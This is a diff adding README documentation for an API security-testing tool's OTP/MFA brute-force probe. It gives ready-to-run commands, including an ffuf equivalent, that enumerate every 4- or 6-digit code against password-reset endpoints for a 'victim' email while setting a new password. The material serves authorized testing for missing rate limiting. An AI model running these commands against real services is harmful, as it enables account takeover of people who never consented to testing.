@@ -20,6 +20,13 @@ Run it in isolation with `apileaks owasp auth --target URL` (recommended for foc
   - [Password brute-force (`--brute-username` / `--passwords-wordlist`)](#password-brute-force)
   - [SQL-injection auth bypass](#sql-injection-auth-bypass)
   - [Success detection (`--success-match` / `--failure-match` / `--success-status`)](#success-detection)
+- [OTP / MFA Brute-Force](#otp--mfa-brute-force)
+  - [OTP endpoint and code space](#otp-endpoint-and-code-space)
+  - [Extra body fields (`--otp-extra-field`)](#extra-body-fields)
+  - [OTP success detection (`--otp-filter-size` / match)](#otp-success-detection)
+  - [Exhaustive enumeration (`--otp-exhaustive`)](#exhaustive-enumeration)
+  - [Replacing an `ffuf` OTP attack](#replacing-an-ffuf-otp-attack)
+- [Hiding HTTP status codes (`--hide-status` / `--hide-errors`)](#hiding-http-status-codes)
 - [Full Option Reference](#full-option-reference)
 - [Finding Categories](#finding-categories)
 - [Remediation](#remediation)
@@ -251,6 +258,148 @@ python apileaks.py owasp auth \
   --success-status '200,302'
 ```
 
+## OTP / MFA Brute-Force
+
+The OTP probe sequentially enumerates numeric one-time-password codes against an OTP verification or password-reset endpoint. It detects missing rate limiting / lockout and can recover a valid code when the endpoint is unprotected. It is gated by `--allow-aggressive-auth` and skipped under `--safe-mode`.
+
+### OTP endpoint and code space
+
+- **`--otp-endpoint URL`** — the OTP verification / reset endpoint (POST, JSON body).
+- **`--otp-digits N`** — number of digits in the code (4 or 6 are common). Default 6.
+- **`--otp-field FIELD`** — JSON field carrying the code. Default `otp`.
+- **`--otp-session-token TOKEN`** / **`--otp-session-field FIELD`** — provisional/session token sent alongside the code, when the flow uses one. Optional if `--otp-extra-field` is supplied instead.
+
+```bash
+# Classic OTP verify flow with a provisional session token
+python apileaks.py owasp auth \
+  --target 'https://api.example.com' \
+  --no-discovery --allow-aggressive-auth \
+  --otp-endpoint 'https://api.example.com/api/v1/auth/otp/verify' \
+  --otp-digits 6 --otp-field code \
+  --otp-session-field session_token \
+  --otp-session-token 'prov_abc123'
+```
+
+### Extra body fields
+
+**`--otp-extra-field KEY=VALUE`** (repeatable) — merges additional fixed fields into the OTP request body. Needed for password-reset flows that carry more than the code, e.g. an email and a new password. When extra fields are supplied, `--otp-session-token` is not required.
+
+```bash
+python apileaks.py owasp auth \
+  --target 'https://api.example.com' \
+  --no-discovery --allow-aggressive-auth \
+  --otp-endpoint 'https://api.example.com/api/v1/authentication/customers/passwords/resets' \
+  --otp-digits 4 --otp-field OTP \
+  --otp-extra-field 'Email=victim@example.com' \
+  --otp-extra-field 'NewPassword=Pwned123!'
+```
+
+The request body sent for each candidate code `0000`..`9999` becomes:
+
+```json
+{"OTP": "0000", "Email": "victim@example.com", "NewPassword": "Pwned123!"}
+```
+
+### OTP success detection
+
+By default a code is accepted on a 2xx status. Most OTP endpoints return 200 for both wrong and right codes, so use one of these (precedence: match → filter-size → 2xx):
+
+- **`--otp-success-match REGEX`** — a body match marks the code as correct (e.g. `'reset successful'`, `'"status"\s*:\s*"ok"'`).
+- **`--otp-failure-match REGEX`** — the ABSENCE of the regex marks success (the regex is the known failure marker, e.g. `'Invalid OTP'`).
+- **`--otp-filter-size N`** — the response byte size of a FAILED attempt (the direct equivalent of `ffuf -fs`). Any other size is treated as a hit.
+
+```bash
+# Success when the wrong-code response is always 23 bytes (ffuf -fs 23)
+python apileaks.py owasp auth \
+  --target 'https://api.example.com' \
+  --no-discovery --allow-aggressive-auth \
+  --otp-endpoint 'https://api.example.com/api/v1/auth/otp/verify' \
+  --otp-digits 4 --otp-field OTP \
+  --otp-extra-field 'Email=victim@example.com' \
+  --otp-filter-size 23
+
+# Success by body marker instead of size
+python apileaks.py owasp auth \
+  --target 'https://api.example.com' \
+  --no-discovery --allow-aggressive-auth \
+  --otp-endpoint 'https://api.example.com/api/v1/auth/otp/verify' \
+  --otp-digits 4 --otp-field OTP \
+  --otp-session-token prov_abc \
+  --otp-failure-match 'Invalid|expired'
+```
+
+### Exhaustive enumeration
+
+By default the probe stops at `--auth-rate-limit-attempts` (default 10) — enough to prove missing rate limiting without hammering the endpoint. To actually crack an unprotected OTP, enumerate the full space:
+
+- **`--otp-exhaustive`** — iterate all `10**digits` codes (10,000 for 4 digits, 1,000,000 for 6). The probe still stops early on the first 429/lockout or on a hit.
+
+```bash
+python apileaks.py owasp auth \
+  --target 'https://api.example.com' \
+  --no-discovery --allow-aggressive-auth \
+  --otp-endpoint 'https://api.example.com/api/v1/auth/otp/verify' \
+  --otp-digits 4 --otp-field OTP \
+  --otp-extra-field 'Email=victim@example.com' \
+  --otp-filter-size 23 \
+  --otp-exhaustive
+```
+
+> Combine with `--rate-limit` to control request pace. The OTP probe is sequential by design (so it can observe lockout accurately); there is no per-request concurrency flag.
+
+### Replacing an `ffuf` OTP attack
+
+A typical `ffuf` OTP brute-force:
+
+```bash
+ffuf -w otp-4digit.txt:OTPA \
+  -u 'http://host/api/v1/authentication/customers/passwords/resets' \
+  -X POST -H 'Content-Type: application/json' \
+  -d '{"Email":"victim@example.com","OTP":"OTPA","NewPassword":"123456"}' \
+  -fs 23 -t 10
+```
+
+Equivalent in APILeak:
+
+```bash
+python apileaks.py owasp auth \
+  --target 'http://host' \
+  --no-discovery --allow-aggressive-auth \
+  --otp-endpoint 'http://host/api/v1/authentication/customers/passwords/resets' \
+  --otp-digits 4 --otp-field OTP \
+  --otp-extra-field 'Email=victim@example.com' \
+  --otp-extra-field 'NewPassword=123456' \
+  --otp-filter-size 23 \
+  --otp-exhaustive \
+  --hide-errors
+```
+
+| `ffuf` | APILeak |
+|--------|---------|
+| `-w otp-4digit.txt:OTPA` + `"OTP":"OTPA"` | `--otp-digits 4 --otp-field OTP` (auto-generates 0000–9999) |
+| `Email` / `NewPassword` in `-d` | `--otp-extra-field 'Email=...'` / `--otp-extra-field 'NewPassword=...'` |
+| `-fs 23` | `--otp-filter-size 23` |
+| full wordlist | `--otp-exhaustive` |
+| `-t 10` | no direct equivalent (sequential); pace with `--rate-limit` |
+
+## Hiding HTTP status codes
+
+The colored HTTP request log prints every request. These display-only filters suppress noise without affecting findings:
+
+- **`--hide-errors`** — hide all 4xx and 5xx requests (shortcut for `--hide-status 4xx,5xx`).
+- **`--hide-status CODES`** — hide specific codes, ranges, or class tokens, e.g. `400,404`, `4xx,5xx`, `400-404`.
+
+There is also the inverse allowlist `--status-code CODES` (scan command) to show only matching codes.
+
+```bash
+python apileaks.py owasp auth \
+  --target 'https://api.example.com/login' \
+  --no-discovery --allow-aggressive-auth \
+  --brute-username admin --passwords-wordlist passwords.txt \
+  --failure-match 'Invalid' \
+  --hide-errors
+```
+
 ## Full Option Reference
 
 | Option | Default | Description |
@@ -271,6 +420,18 @@ python apileaks.py owasp auth \
 | `--success-match REGEX` | — | Body regex marking success. |
 | `--failure-match REGEX` | — | Body regex whose absence marks success. |
 | `--success-status CODES` | 2xx | Status codes counting as success. |
+| `--otp-endpoint URL` | — | OTP verification / reset endpoint. |
+| `--otp-digits N` | 6 | Number of digits in the OTP code. |
+| `--otp-field FIELD` | `otp` | JSON field carrying the code. |
+| `--otp-session-token TOKEN` | — | Provisional/session token (optional with extra fields). |
+| `--otp-session-field FIELD` | `session_token` | Session token field name. |
+| `--otp-extra-field KEY=VALUE` | — | Extra fixed body field (repeatable). |
+| `--otp-success-match REGEX` | — | Body regex marking a correct OTP. |
+| `--otp-failure-match REGEX` | — | Body regex whose absence marks a correct OTP. |
+| `--otp-filter-size N` | — | Failure response size (ffuf `-fs`); other sizes = hit. |
+| `--otp-exhaustive` | off | Enumerate the full `10**digits` space. |
+| `--hide-status CODES` | — | Hide status codes/classes from the request log. |
+| `--hide-errors` | off | Hide all 4xx/5xx from the request log. |
 
 ## Finding Categories
 
@@ -280,6 +441,8 @@ python apileaks.py owasp auth \
 | `AUTH_PASSWORD_SPRAY_NO_DETECTION` | HIGH | Full spray completed with no rate limit / anomaly detection. |
 | `AUTH_PASSWORD_BRUTE_FORCE_VALID_CREDENTIAL` | CRITICAL | A password (or SQLi payload) was accepted for the username. |
 | `AUTH_PASSWORD_BRUTE_FORCE_NO_LOCKOUT` | HIGH | Full brute-force completed with no lockout / rate limit. |
+| `AUTH_OTP_BRUTEFORCE_SUCCESS` | CRITICAL | An OTP code was accepted after enumeration. |
+| `AUTH_OTP_NO_RATE_LIMITING` | HIGH | OTP endpoint did not throttle/lock after repeated attempts. |
 
 ## Remediation
 
